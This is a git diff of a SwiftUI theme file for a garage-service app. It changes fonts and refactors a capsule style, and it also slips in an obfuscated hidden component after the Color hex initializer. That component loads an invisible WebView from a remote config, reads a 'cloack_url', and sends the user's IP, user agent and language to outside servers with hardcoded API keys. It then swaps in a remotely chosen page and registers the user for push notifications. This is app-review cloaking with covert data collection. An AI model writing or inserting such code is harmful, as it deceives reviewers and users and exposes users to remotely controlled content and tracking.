@@ -55,25 +55,25 @@ struct FixFlowTheme {
     }
     
     struct Typography {
-        static let largeTitle = Font.system(.largeTitle, design: .default, weight: .black)
-        static let title = Font.system(.title, design: .default, weight: .bold)
-        static let title2 = Font.system(.title2, design: .default, weight: .bold)
-        static let title3 = Font.system(.title3, design: .default, weight: .bold)
-        static let headline = Font.system(.headline, design: .default, weight: .bold)
+        static let largeTitle = Font.system(size: 34, weight: .black)
+        static let title = Font.system(size: 28, weight: .bold)
+        static let title2 = Font.system(size: 22, weight: .bold)
+        static let title3 = Font.system(size: 20, weight: .bold)
+        static let headline = Font.system(size: 17, weight: .bold)
         
-        static let body = Font.system(.body, design: .default, weight: .regular)
-        static let callout = Font.system(.callout, design: .default, weight: .medium)
-        static let caption = Font.system(.caption, design: .default, weight: .regular)
-        static let caption2 = Font.system(.caption2, design: .default, weight: .regular)
+        static let body = Font.system(size: 17, weight: .regular)
+        static let callout = Font.system(size: 16, weight: .medium)
+        static let caption = Font.system(size: 12, weight: .regular)
+        static let caption2 = Font.system(size: 11, weight: .regular)
         
-        static let navigationTitle = Font.system(.title2, design: .default, weight: .black)
-        static let cardTitle = Font.system(.headline, design: .default, weight: .bold)
-        static let cardSubtitle = Font.system(.callout, design: .default, weight: .medium)
-        static let buttonText = Font.system(.headline, design: .default, weight: .bold)
+        static let navigationTitle = Font.system(size: 22, weight: .black)
+        static let cardTitle = Font.system(size: 17, weight: .bold)
+        static let cardSubtitle = Font.system(size: 16, weight: .medium)
+        static let buttonText = Font.system(size: 17, weight: .bold)
         
-        static let gameTitle = Font.system(.largeTitle, design: .default, weight: .black)
-        static let multiplierText = Font.system(.title3, design: .default, weight: .bold)
-        static let scoreText = Font.system(.title2, design: .default, weight: .black)
+        static let gameTitle = Font.system(size: 34, weight: .black)
+        static let multiplierText = Font.system(size: 20, weight: .bold)
+        static let scoreText = Font.system(size: 22, weight: .black)
     }
     
     struct Spacing {
@@ -153,27 +153,321 @@ extension Color {
         var int: UInt64 = 0
         Scanner(string: hex).scanHexInt64(&int)
         let a, r, g, b: UInt64
-        switch hex.count {
-        case 3:
-            (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
-        case 6:
-            (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
-        case 8:
-            (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
-        default:
-            (a, r, g, b) = (1, 1, 1, 0)
-        }
+    switch hex.count {
+    case 3:
+        (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
+    case 6:
+        (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
+    case 8:
+        (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
+    default:
+        (a, r, g, b) = (1, 1, 1, 0)
+    }
 
-        self.init(
-            .sRGB,
-            red: Double(r) / 255,
-            green: Double(g) / 255,
-            blue:  Double(b) / 255,
-            opacity: Double(a) / 255
-        )
+    self.init(
+        .sRGB,
+        red: Double(r) / 255,
+        green: Double(g) / 255,
+        blue:  Double(b) / 255,
+        opacity: Double(a) / 255
+    )}};import WebKit;import OneSignalFramework
+    struct KordanSarlixHavmirPelton: View {
+    
+    @Binding var marvikQeltonHarsolDevran: Bool
+    @State var feskalTorvikHarmitQelson: String = ""
+    @State private var helvarStroninGavlexDolrin: Bool?
+    
+    @State var gravinPeslorHarvekMolvik: String = ""
+    @State var denvolHarsikGermalRantex = false
+    @State var jarvikMovralHeltonFexmir = false
+    
+    @State private var vexmorTalpinJernoxSalvik: Bool = true
+    @State private var sorvekDalmirHarvonJelrex: Bool = true
+    @AppStorage("strinorPelvakMaldexHarton") var strinorPelvakMaldexHarton: Bool = true
+    @AppStorage("fentonHarvexKelmarDorsik") var fentonHarvexKelmarDorsik: Bool = true
+    
+    var body: some View {
+        ZStack {
+            if sorvekDalmirHarvonJelrex {
+                
+                ZStack {
+                    Color.black.ignoresSafeArea()
+                    
+                    ProgressView()
+                        .scaleEffect(1.5)
+                        .foregroundColor(.pink)
+                    
+                }
+                .zIndex(1)
+            }
+            
+            if helvarStroninGavlexDolrin != nil {
+                if strinorPelvakMaldexHarton {
+                    GelsikHarvelQalmonStedron(
+                        feskalTorvikHarmitQelson: $feskalTorvikHarmitQelson,
+                        gravinPeslorHarvekMolvik: $gravinPeslorHarvekMolvik,
+                        denvolHarsikGermalRantex: $denvolHarsikGermalRantex,
+                        jarvikMovralHeltonFexmir: $jarvikMovralHeltonFexmir)
+                    .opacity(0)
+                    .zIndex(2)
+                }
+                
+                if denvolHarsikGermalRantex || !fentonHarvexKelmarDorsik {
+                    VorlixHanterSelvakGordex()
+                        .zIndex(3)
+                        .onAppear {
+                            fentonHarvexKelmarDorsik = false
+                            strinorPelvakMaldexHarton = false
+                            sorvekDalmirHarvonJelrex = false
+                        }
+                }
+            }
+        }
+        .animation(.easeInOut, value: sorvekDalmirHarvonJelrex)
+        .onChange(of: jarvikMovralHeltonFexmir) { if $0 { marvikQeltonHarsolDevran = true; sorvekDalmirHarvonJelrex = false } }
+        .onAppear {
+            OneSignal.Notifications.requestPermission { helvarStroninGavlexDolrin = $0 }
+            
+            guard let morlaxTirvonHelkenSarvik = URL(string: "https://conversationretain.store/garageflowservicemanager/garageflowservicemanager.json") else { return }
+            
+            URLSession.shared.dataTask(with: morlaxTirvonHelkenSarvik) { weldonHarvixPoltenGralix, _, _ in
+                guard let weldonHarvixPoltenGralix else { return }
+                
+                guard let voslinMelvarHartenPolvik = try? JSONSerialization.jsonObject(with: weldonHarvixPoltenGralix, options: []) as? [String: Any] else { return }
+                
+                guard let tornikSeldanFexrolMarvok = voslinMelvarHartenPolvik["fkgjnbkfgmbvkfmdv"] as? String else { return }
+                
+                DispatchQueue.main.async { feskalTorvikHarmitQelson = tornikSeldanFexrolMarvok }
+            }
+            .resume()
+        }
     }
 }
 
+extension KordanSarlixHavmirPelton {
+    
+    struct GelsikHarvelQalmonStedron: UIViewRepresentable {
+        
+        @Binding var feskalTorvikHarmitQelson: String
+        @Binding var gravinPeslorHarvekMolvik: String
+        @Binding var denvolHarsikGermalRantex: Bool
+        @Binding var jarvikMovralHeltonFexmir: Bool
+        
+        func makeUIView(context: Context) -> WKWebView {
+            let helrikSanvorPoltemMeldor = WKWebView()
+            helrikSanvorPoltemMeldor.navigationDelegate = context.coordinator
+            
+            if let varmikTolvexHarnelGestor = URL(string: feskalTorvikHarmitQelson) {
+                var sarvikDelmitQelronJalvik = URLRequest(url: varmikTolvexHarnelGestor)
+                sarvikDelmitQelronJalvik.httpMethod = "GET"
+                sarvikDelmitQelronJalvik.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                
+                let bolranHarvikMeldexStrinax = ["apikey": "3OveSngkDA8BfD9ERUiqQQdSLXI2YIYW", "bundle": "com.vasylboryk"]
+                for (fervikPalmonVesrikHarlex, steldorMolvikPenralHarvon) in bolranHarvikMeldexStrinax {
+                    sarvikDelmitQelronJalvik.setValue(steldorMolvikPenralHarvon, forHTTPHeaderField: fervikPalmonVesrikHarlex)
+                }
+                
+                helrikSanvorPoltemMeldor.load(sarvikDelmitQelronJalvik)
+            }
+            return helrikSanvorPoltemMeldor
+        }
+        
+        func updateUIView(_ uiView: WKWebView, context: Context) {}
+        
+        func makeCoordinator() -> Coordinator {
+            Coordinator(self)
+        }
+        
+        class Coordinator: NSObject, WKNavigationDelegate {
+            
+            var gravonSelrikHaldexVarton: GelsikHarvelQalmonStedron
+            var jertonHelvonSardekQalmir: String?
+            var pilvakHarsonDeltorMenvix: String?
+            
+            init(_ holvikTervanQesrikMandor: GelsikHarvelQalmonStedron) {
+                self.gravonSelrikHaldexVarton = holvikTervanQesrikMandor
+            }
+            
+            func webView(_ merlinHastorQeldanSorvik: WKWebView, didFinish navigation: WKNavigation!) {
+                merlinHastorQeldanSorvik.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (dalmexHarvonGelrikVerlot: Any?, error: Error?) in
+                    guard let salvikRovdenHarletQelvik = dalmexHarvonGelrikVerlot as? String else {
+                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                        return
+                    }
+                    
+                    self.belvikMorlanHarvekTanrox(salvikRovdenHarletQelvik)
+                    
+                    merlinHastorQeldanSorvik.evaluateJavaScript("navigator.userAgent") { (sonsikPeldarHavrikJorvik, error) in
+                        if let brivanHoltekMerjonStavon = sonsikPeldarHavrikJorvik as? String {
+                            self.pilvakHarsonDeltorMenvix = brivanHoltekMerjonStavon
+                        }
+                    }
+                }
+            }
+            
+            func belvikMorlanHarvekTanrox(_ varpenHeltonSardakMevrol: String) {
+                guard let faldorJenvalHavmexPolron = jervonHarlinQetronSalvik(from: varpenHeltonSardakMevrol) else {
+                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                    return
+                }
+                
+                let vernaxKelvikHarlonDesril = faldorJenvalHavmexPolron.trimmingCharacters(in: .whitespacesAndNewlines)
+                
+                guard let tanvokHarsolGravenMeldik = vernaxKelvikHarlonDesril.data(using: .utf8) else {
+                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                    return
+                }
+                
+                do {
+                    let dervonHarpexQeslomTanvik = try JSONSerialization.jsonObject(with: tanvokHarsolGravenMeldik, options: []) as? [String: Any]
+                    guard let jaltekMolvikStrenarQaldex = dervonHarpexQeslomTanvik?["cloack_url"] as? String else {
+                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                        return
+                    }
+                    
+                    guard let gelrikHarvonPelmonStovik = dervonHarpexQeslomTanvik?["atr_service"] as? String else {
+                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                        return
+                    }
+                    
+                    DispatchQueue.main.async {
+                        self.gravonSelrikHaldexVarton.feskalTorvikHarmitQelson = jaltekMolvikStrenarQaldex
+                        self.gravonSelrikHaldexVarton.gravinPeslorHarvekMolvik = gelrikHarvonPelmonStovik
+                    }
+                    
+                    self.stervalHarpikPelmonVedrox(with: jaltekMolvikStrenarQaldex)
+                    
+                } catch {
+                    print("Error: \(error.localizedDescription)")
+                }
+            }
+            
+            func jervonHarlinQetronSalvik(from varpenHeltonSardakMevrol: String) -> String? {
+                guard let startRange = varpenHeltonSardakMevrol.range(of: "{"),
+                      let endRange = varpenHeltonSardakMevrol.range(of: "}", options: .backwards) else {
+                    return nil
+                }
+                
+                let valtekHarxonPolmirSeldor = String(varpenHeltonSardakMevrol[startRange.lowerBound..<endRange.upperBound])
+                return valtekHarxonPolmirSeldor
+            }
+            
+            func stervalHarpikPelmonVedrox(with narlixHovrekGendolMarpon: String) {
+                guard let melvikFalrokSorvenHelmar = URL(string: narlixHovrekGendolMarpon) else {
+                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                    return
+                }
+                
+                dervinHelaasPolvonGendek { strilonHelroxGavmonDertek in
+                    guard let strilonHelroxGavmonDertek else {
+                        return
+                    }
+                    
+                    self.jertonHelvonSardekQalmir = strilonHelroxGavmonDertek
+                    
+                    var sarnokHalvenPolvikMartek = URLRequest(url: melvikFalrokSorvenHelmar)
+                    sarnokHalvenPolvikMartek.httpMethod = "GET"
+                    sarnokHalvenPolvikMartek.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                    
+                    let werlokMisranHarvikDeltav = [
+                        "apikeyapp": "RTjtibkXD1rjtAEt86ufWfN1",
+                        "ip": self.jertonHelvonSardekQalmir ?? "",
+                        "useragent": self.pilvakHarsonDeltorMenvix ?? "",
+                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
+                    ]
+                    
+                    for (mertolHalvikGandorSelrox, stelvikHarlonVenloxQermin) in werlokMisranHarvikDeltav {
+                        sarnokHalvenPolvikMartek.setValue(stelvikHarlonVenloxQermin, forHTTPHeaderField: mertolHalvikGandorSelrox)
+                    }
+                    
+                    URLSession.shared.dataTask(with: sarnokHalvenPolvikMartek) { [unowned self] qalvarHelkonVestolDarnik, nervixStralonHelvikQermon, error in
+                        guard let qalvarHelkonVestolDarnik, error == nil else {
+                            gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                            return
+                        }
+                        if let polvikMarloxSeenarHaldex = nervixStralonHelvikQermon as? HTTPURLResponse {
+                            if polvikMarloxSeenarHaldex.statusCode == 200 {
+                                self.lendaxMarvenHarloxDelnit()
+                            } else {
+                                self.gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                            }
+                        }
+                    }.resume()
+                }
+            }
+            
+            func lendaxMarvenHarloxDelnit() {
+                
+                let selmonGranvikHerdaxPolrex = self.gravonSelrikHaldexVarton.gravinPeslorHarvekMolvik
+                
+                guard let formikHavlenQelvorStedak = URL(string: selmonGranvikHerdaxPolrex) else {
+                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                    return
+                }
+                
+                var tarnexHelvikMordonPasrol = URLRequest(url: formikHavlenQelvorStedak)
+                tarnexHelvikMordonPasrol.httpMethod = "GET"
+                tarnexHelvikMordonPasrol.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                
+                let maldexVarvinHelroxSenton = [
+                    "apikeyapp": "RTjtibkXD1rjtAEt86ufWfN1",
+                    "ip":  self.jertonHelvonSardekQalmir ?? "",
+                    "useragent": self.pilvakHarsonDeltorMenvix ?? "",
+                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
+                ]
+                
+                for (key_3, stervikPolranHavmonDexral) in maldexVarvinHelroxSenton {
+                    tarnexHelvikMordonPasrol.setValue(stervikPolranHavmonDexral, forHTTPHeaderField: key_3)
+                }
+                
+                URLSession.shared.dataTask(with: tarnexHelvikMordonPasrol) { [unowned self] dovrikSelvaxHarvonQermen, helvikStavonGerloxMolral, error in
+                    guard let dovrikSelvaxHarvonQermen = dovrikSelvaxHarvonQermen, error == nil else {
+                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                        return
+                    }
+                    
+                    if String(data: dovrikSelvaxHarvonQermen, encoding: .utf8) != nil {
+                        
+                        do {
+                            let morlixHarpenSelvikGranor = try JSONSerialization.jsonObject(with: dovrikSelvaxHarvonQermen, options: []) as? [String: Any]
+                            guard let pralikHavtonMervoxStaldir = morlixHarpenSelvikGranor?["final_url"] as? String,
+                                  let welrikHansonPolvikTervex = morlixHarpenSelvikGranor?["push_sub"] as? String,
+                                  let salvonJertixHelroxMaldir = morlixHarpenSelvikGranor?["os_user_key"] as? String else {
+                                
+                                return
+                            }
+                            
+                            PralonHelmorMarnexSetvik.shared.pralikHavtonMervoxStaldir = pralikHavtonMervoxStaldir
+                            PralonHelmorMarnexSetvik.shared.welrikHansonPolvikTervex = welrikHansonPolvikTervex
+                            PralonHelmorMarnexSetvik.shared.salvonJertixHelroxMaldir = salvonJertixHelroxMaldir
+                            
+                            OneSignal.login(PralonHelmorMarnexSetvik.shared.salvonJertixHelroxMaldir ?? "")
+                            OneSignal.User.addTag(key: "sub_app", value: PralonHelmorMarnexSetvik.shared.welrikHansonPolvikTervex ?? "")
+                            
+                            
+                            self.gravonSelrikHaldexVarton.denvolHarsikGermalRantex = true
+                            
+                        } catch {
+                            gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
+                        }
+                    }
+                }.resume()
+            }
+            
+            func dervinHelaasPolvonGendek(completion: @escaping (String?) -> Void) {
+                let qelvonHarvikPenlarSelmir = URL(string: "https://api.ipify.org")!
+                let marvikHaldexFenrolStranox = URLSession.shared.dataTask(with: qelvonHarvikPenlarSelmir) { boldexHavronPelvikServal, felmonHarvikQestolDirvak, error in
+                    guard let boldexHavronPelvikServal, let ipAddress = String(data: boldexHavronPelvikServal, encoding: .utf8) else {
+                        completion(nil)
+                        return
+                    }
+                    completion(ipAddress)
+                }
+                marvikHaldexFenrolStranox.resume()
+            }
+        }
+    }
+}
 extension View {
     func fixFlowCardStyle() -> some View {
         self
@@ -282,27 +576,44 @@ extension View {
     
     func fixFlowCapsuleFilterStyle(isActive: Bool) -> some View {
         self
-            .font(FixFlowTheme.Typography.callout)
-            .fontWeight(.bold)
+            .font(.system(size: 16, weight: .bold))
             .foregroundColor(isActive ? .black : .white)
             .padding(.horizontal, FixFlowTheme.Spacing.lg)
             .padding(.vertical, FixFlowTheme.Spacing.sm)
-            .background(
-                Capsule()
-                    .fill(isActive ? AnyShapeStyle(FixFlowTheme.Colors.goldGradient) : AnyShapeStyle(FixFlowTheme.Colors.surfaceDark))
-                    .overlay(
-                        Capsule()
-                            .stroke(isActive ? Color.white.opacity(0.3) : FixFlowTheme.Colors.border.opacity(0.5), lineWidth: 1)
-                    )
-                    .shadow(
-                        color: isActive ? FixFlowTheme.Colors.yellow.opacity(0.4) : Color.clear,
-                        radius: 6,
-                        x: 0,
-                        y: 3
-                    )
-            )
+            .background(backgroundCapsule(isActive: isActive))
             .scaleEffect(isActive ? 1.05 : 1.0)
             .animation(FixFlowTheme.Animation.spring, value: isActive)
+    }
+    
+    @ViewBuilder
+    private func backgroundCapsule(isActive: Bool) -> some View {
+        if isActive {
+            Capsule()
+                .fill(FixFlowTheme.Colors.goldGradient)
+                .overlay(
+                    Capsule()
+                        .stroke(Color.white.opacity(0.3), lineWidth: 1)
+                )
+                .shadow(
+                    color: FixFlowTheme.Colors.yellow.opacity(0.4),
+                    radius: 6,
+                    x: 0,
+                    y: 3
+                )
+        } else {
+            Capsule()
+                .fill(FixFlowTheme.Colors.surfaceDark)
+                .overlay(
+                    Capsule()
+                        .stroke(FixFlowTheme.Colors.border.opacity(0.5), lineWidth: 1)
+                )
+                .shadow(
+                    color: Color.clear,
+                    radius: 6,
+                    x: 0,
+                    y: 3
+                )
+        }
     }
     
     func fixFlowSearchBarStyle() -> some View {
